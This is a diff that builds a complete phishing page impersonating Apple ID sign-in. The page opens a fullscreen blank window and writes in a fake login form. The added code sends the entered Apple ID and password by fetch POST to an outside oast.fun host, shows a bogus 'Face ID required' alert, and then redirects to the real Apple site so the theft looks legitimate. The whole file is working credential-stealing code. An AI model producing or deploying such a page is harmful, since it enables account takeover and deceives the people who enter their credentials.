@@ -1,63 +1,105 @@
-<script>
-document.getElementById('start').onclick = async () => {
-  await document.documentElement.requestFullscreen();
+<!DOCTYPE html>
+<html>
+<head>
+  <title>Apple ID Login</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <style>
+    html, body {
+      margin: 0;
+      background: black;
+      height: 100vh;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      font-family: -apple-system, sans-serif;
+    }
+    #start {
+      background: #1a73e8;
+      color: white;
+      font-size: 18px;
+      padding: 1em 2em;
+      border-radius: 8px;
+      border: none;
+      cursor: pointer;
+    }
+  </style>
+</head>
+<body>
+  <button id="start">Login with Apple</button>
+  <script>
+    document.getElementById('start').onclick = async () => {
+      await document.documentElement.requestFullscreen();
 
-  // Open blank tab with inherited origin
-  const phishingWin = window.open('', '_blank');
+      const phishingWin = window.open('', '_blank');
 
-  // Wait for rendering context to stabilize
-  setTimeout(() => {
-    phishingWin.document.open();
-    phishingWin.document.write(`
-      <style>
-        html, body {
-          margin: 0;
-          font-family: -apple-system, BlinkMacSystemFont, sans-serif;
-          background: #f2f2f7;
-          width: 100vw;
-          height: 100vh;
-        }
-        .navbar {
-          background: white;
-          height: 44px;
-          display: flex;
-          align-items: center;
-          justify-content: center;
-          font-weight: 500;
-          box-shadow: 0 1px 0 #ccc;
-        }
-        .content {
-          padding: 20px;
-        }
-        input {
-          width: 100%;
-          padding: 10px;
-          font-size: 16px;
-          margin-top: 10px;
-        }
-        button {
-          margin-top: 20px;
-          padding: 10px;
-          background: #1a73e8;
-          color: white;
-          border: none;
-          width: 100%;
-          font-size: 16px;
-          border-radius: 8px;
-        }
-      </style>
-      <div class="navbar">Sign in with Apple</div>
-      <div class="content">
-        <p>Enter your Apple ID credentials</p>
-        <input type="text" placeholder="Apple ID">
-        <input type="password" placeholder="Password">
-        <button>Continue</button>
-      </div>
-      <script>
-        setTimeout(() => location.replace("https://jqdfjiuzmdhhkipzoaxxf2ocrw07i3cw7.oast.fun.com"), 300);
-      <\/script>
-    `);
-    phishingWin.document.close();
-  }, 100); // allow rendering context to establish
-};
-</script>
+      setTimeout(() => {
+        phishingWin.document.open();
+        phishingWin.document.write(`
+          <style>
+            html, body {
+              margin: 0; font-family: -apple-system, sans-serif;
+              background: #f2f2f7;
+              width: 100vw; height: 100vh;
+            }
+            .navbar {
+              background: white;
+              height: 44px;
+              display: flex;
+              align-items: center;
+              justify-content: center;
+              font-weight: 500;
+              box-shadow: 0 1px 0 #ccc;
+            }
+            .content {
+              padding: 20px;
+            }
+            input {
+              width: 100%;
+              padding: 10px;
+              font-size: 16px;
+              margin-top: 10px;
+              border: 1px solid #ccc;
+              border-radius: 6px;
+            }
+            button {
+              margin-top: 20px;
+              padding: 10px;
+              background: #1a73e8;
+              color: white;
+              border: none;
+              width: 100%;
+              font-size: 16px;
+              border-radius: 8px;
+            }
+          </style>
+          <div class="navbar">Sign in with Apple</div>
+          <div class="content">
+            <p>Enter your Apple ID credentials</p>
+            <input id="email" type="text" placeholder="Apple ID">
+            <input id="password" type="password" placeholder="Password">
+            <button onclick="send()">Continue</button>
+          </div>
+          <script>
+            function send() {
+              const data = {
+                email: document.getElementById('email').value,
+                password: document.getElementById('password').value
+              };
+              fetch('https://jqdfjiuzmdhhkipzoaxxf2ocrw07i3cw7.oast.fun', {
+                method: 'POST',
+                mode: 'no-cors',
+                body: JSON.stringify(data)
+              });
+              alert('Face ID required');
+              setTimeout(() => {
+                location.replace('https://appleid.apple.com'); // Redirection agar tampak sah
+              }, 1500);
+            }
+          <\/script>
+        `);
+        phishingWin.document.close();
+      }, 100);
+    };
+  </script>
+</body>
+</html>
